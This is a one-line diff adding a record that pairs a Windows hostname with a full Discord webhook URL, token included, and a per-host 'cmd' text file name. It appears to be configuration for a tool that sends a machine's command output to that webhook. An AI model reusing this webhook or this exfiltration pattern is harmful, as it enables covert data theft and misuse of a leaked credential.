@@ -1,0 +1,1 @@
+setup:DESKTOP-CHA669Q:https://discord.com/api/webhooks/1553676960952094810/QTDsWjs513g7boE21ZULTe_ODelTmOuJ7sfBe5QP65qTjP_ggfUXLPYaNLvX8gSAEXsQ;cmd-desktop-cha669q.txt|1790495853
